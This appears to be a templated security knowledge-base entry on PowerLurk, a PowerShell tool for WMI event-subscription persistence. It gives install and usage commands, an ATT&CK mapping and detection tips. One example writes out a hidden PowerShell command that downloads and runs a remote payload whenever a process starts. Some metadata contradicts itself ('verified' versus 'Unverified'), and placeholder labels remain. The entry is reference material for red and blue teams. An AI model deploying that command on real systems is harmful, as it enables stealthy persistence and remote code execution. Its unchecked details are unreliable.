---
id: fbbb5b8d-8587-497e-b5b5-10e995fc4d06
type: tool
verified: true
created_at: '2019-08-28T21:17:24.426366+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Windows
tags:
  - persistence
  - wmi
  - powershell
  - post-exploitation
url: 'https://github.com/EmpireProject/PowerLurk'
validated: true
---

# PowerLurk

**Status**: Unverified

## Overview

PowerLurk is a PowerShell-based toolset designed for creating and managing malicious WMI (Windows Management Instrumentation) event subscriptions. It is commonly used in red team operations for establishing persistence on Windows systems by triggering actions based on system events, such as process creation or logon events, without relying on traditional scheduled tasks or registry run keys.

## Description

PowerLurk provides cmdlets to automate the creation, enumeration, and removal of WMI event filters, consumers, and bindings. This allows attackers to execute payloads stealthily in response to specific triggers, evading basic detection. It is particularly effective in enterprise environments where WMI is enabled by default. The tool integrates well with other PowerShell frameworks like PowerSploit or Empire for post-exploitation workflows.

## Features

- Feature 1: Creation of permanent WMI event subscriptions with custom WQL queries for event triggers.
- Feature 2: Support for various action types, including command-line execution, script blocks, and remote payload downloads.
- Feature 3: Enumeration and removal functions to manage subscriptions without manual WMI queries.
- Feature 4: Obfuscation options to hide subscription details from casual inspection.

## Installation

### Requirements

- PowerShell 2.0 or later (Windows 7+).
- Administrative privileges for WMI modifications (or SeDebugPrivilege for some operations).
- Internet access if downloading the module.

### Install Commands

```powershell
# Download from GitHub
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/EmpireProject/PowerLurk/master/PowerLurk.ps1" -OutFile "PowerLurk.ps1"

# Or clone the repo
git clone https://github.com/EmpireProject/PowerLurk.git
cd PowerLurk
```

On Kali or Ubuntu (for cross-platform development):

```bash
# Use PowerShell Core
sudo apt install powershell
pwsh -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/EmpireProject/PowerLurk/master/PowerLurk.ps1' -OutFile 'PowerLurk.ps1'"
```

## Basic Usage

```powershell
Import-Module PowerLurk.ps1
Get-Help New-WmiEventSubscription
```

### Common Options

| Option | Description |
|--------|-------------|
| -SubscriptionName | Specifies the name of the subscription |
| -Query | WQL query for the event filter |
| -CommandLineTemplate | Template for the action executable |
| -Verbose | Enables detailed output during operations |

## Examples

### Example 1: Basic Usage

Load the module and create a simple subscription:

```powershell
Import-Module PowerLurk.ps1
New-WmiEventSubscription -SubscriptionName 'TestSub' -Query 'SELECT * FROM Win32_ProcessStartTrace' -CommandLineTemplate 'cmd.exe /c echo Event Triggered'
```

### Example 2: Advanced Usage

Create a subscription that downloads and executes a remote payload on process creation:

```powershell
Import-Module PowerLurk.ps1
New-WmiEventSubscription -SubscriptionName 'PayloadSub' -Query 'SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_Process"' -CommandLineTemplate 'powershell.exe -NoP -W Hidden -C "IEX (New-Object Net.WebClient).DownloadString(\\\"http://192.168.1.100/payload.ps1\\\")"'
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Windows Management Instrumentation Event Subscription]] Event Triggered Execution: WMI Event Subscription
- [[PowerShell]] Command and Scripting Interpreter: PowerShell

### Tactics

- [[Persistence]] Persistence
- [[Execution]] Execution

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: Monitor WMI repository for suspicious event subscriptions using `Get-WmiObject -Namespace root\subscription -Class __EventConsumer`.
- Detection method 2: Enable PowerShell logging (Module, ScriptBlock) to capture Import-Module calls.
- Detection method 3: Audit WMI activity via Event ID 5861 (WMI-Activity) in Windows Security logs.
- Detection method 4: Look for anomalous network connections from PowerShell processes to external IPs.

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Empire]]
- [[tools/PowerSploit]]

## References

- Official GitHub: https://github.com/EmpireProject/PowerLurk
- MITRE ATT&CK: https://attack.mitre.org/techniques/T1546/003/
- PowerShell Empire Documentation
